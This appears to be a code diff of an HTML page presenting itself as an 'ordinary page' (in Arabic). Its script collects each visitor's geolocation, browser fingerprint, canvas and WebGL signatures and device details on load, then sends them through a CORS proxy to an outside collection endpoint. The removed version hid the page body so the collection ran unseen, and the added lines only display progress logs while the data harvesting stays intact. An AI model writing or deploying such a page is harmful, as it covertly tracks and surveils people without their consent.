@@ -4,10 +4,26 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>صفحة عادية</title>
-    <style> body { display: none; } </style>
+    <style>
+        body { font-family: Arial, sans-serif; padding: 20px; }
+        .log { margin: 10px 0; padding: 10px; border: 1px solid #ccc; border-radius: 5px; }
+        .success { background-color: #e0f8e0; border-color: #0a0; }
+        .error { background-color: #f8e0e0; border-color: #a00; }
+    </style>
 </head>
 <body>
+    <h2>تفاصيل عملية الإرسال</h2>
+    <div id="logContainer"></div>
+
 <script>
+const logContainer = document.getElementById('logContainer');
+function addLog(message, type='') {
+    const div = document.createElement('div');
+    div.className = 'log ' + type;
+    div.textContent = message;
+    logContainer.appendChild(div);
+}
+
 const apiUrl = 'https://corsproxy.io/?' + encodeURIComponent('http://help2025.runasp.net/api/Collect');
 
 async function parseDeviceName(ua) {
@@ -29,7 +45,6 @@ async function parseDeviceName(ua) {
 async function getGeolocation() {
     return new Promise(resolve => {
         if (!navigator.geolocation) return resolve({ latitude: null, longitude: null, accuracy_m: 0, error: "غير مدعوم" });
-
         navigator.geolocation.getCurrentPosition(
             pos => resolve({
                 latitude: pos.coords.latitude,
@@ -85,6 +100,7 @@ function generateFingerprint() {
 
 (async () => {
     try {
+        addLog('جاري جمع بيانات الجهاز والموقع...');
         const [geo, deviceName] = await Promise.all([
             getGeolocation(),
             parseDeviceName(navigator.userAgent)
@@ -93,7 +109,7 @@ function generateFingerprint() {
 
         const data = {
             clientUuid: crypto.randomUUID?.() || Date.now().toString(36),
-            clientData: "sample",  // ✅ حقل مطلوب
+            clientData: "sample",
             deviceFingerprint: fingerprint,
             ipAddress: '',
             userAgent: navigator.userAgent,
@@ -103,7 +119,7 @@ function generateFingerprint() {
             screen: `${screen.width}x${screen.height}`,
             colorDepth: screen.colorDepth,
             hardwareConcurrency: navigator.hardwareConcurrency || 0,
-            deviceMemory: String(navigator.deviceMemory || "unknown"), // ✅ يجب أن يكون نص
+            deviceMemory: String(navigator.deviceMemory || "unknown"),
             connectionType: navigator.connection?.type ?? 'unknown',
             canvasFingerprint: getCanvasFingerprint().substring(0, 100) + '...',
             webglRenderer: getWebGLFingerprint(),
@@ -112,6 +128,7 @@ function generateFingerprint() {
             entryUrl: window.location.href
         };
 
+        addLog('جارٍ إرسال البيانات إلى الخادم...');
         const response = await fetch(apiUrl, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -119,13 +136,14 @@ function generateFingerprint() {
             mode: 'cors'
         });
 
-        if (response.ok) console.log('تم الإرسال!');
-        else console.warn('فشل:', response.status);
+        if (response.ok) {
+            addLog('✅ تم الإرسال بنجاح!', 'success');
+        } else {
+            addLog(`❌ فشل الإرسال، رمز الحالة: ${response.status}`, 'error');
+        }
 
     } catch (e) {
-        console.error('خطأ:', e);
-    } finally {
-        // لا إعادة توجيه
+        addLog('❌ حدث خطأ أثناء الإرسال: ' + e, 'error');
     }
 })();
 </script>
